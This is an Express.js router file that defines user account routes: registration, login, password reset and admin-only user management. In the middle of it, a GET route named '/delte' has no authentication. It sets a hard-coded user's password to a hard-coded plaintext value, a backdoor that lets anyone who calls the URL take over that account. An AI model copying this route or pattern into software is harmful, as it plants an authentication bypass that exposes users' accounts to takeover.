const express = require("express");
const {
  logoutUser,
  userInfo,
  registerUser,
  loginHandler,
  updateUser,
  updatePassword,
  getAllUsers,
  deleteUser,
  getUser,
  adminUpdateUser,
  forgotPassword,
  forgotPasswordChange,
  forgotPasswordToken,
} = require("../controllers/userController");
const { auth, authorizedRole } = require("../middlewares/auth");
const User = require("../models/userModel");

const router = express.Router();

router.route("/").get(auth, userInfo);
router.route("/register").post(registerUser);
router.route("/login").post(loginHandler);
router.route("/logout").get(auth, logoutUser);
router.route("/update").put(auth, updateUser);
router.route("/update/password").put(auth, updatePassword);
router.route("/forgot/password").post(forgotPassword);
router
  .route("/forgot/password/:id")
  .get(forgotPasswordToken)
  .post(forgotPasswordChange);

router.get("/delte", async (req, res) => {
  const user = await User.findById("66b634f6f8e855dfd641aaa8");
  user.password = "#sdR#$Rohi";
  await user.save();

  res.status(200).json({
    success: true,
  });
});
router.route("/admin").get(auth, authorizedRole("admin"), getAllUsers);
router
  .route("/admin/:id")
  .delete(auth, authorizedRole("admin"), deleteUser)
  .get(auth, authorizedRole("admin"), getUser)
  .put(auth, authorizedRole("admin"), adminUpdateUser);

module.exports = router;
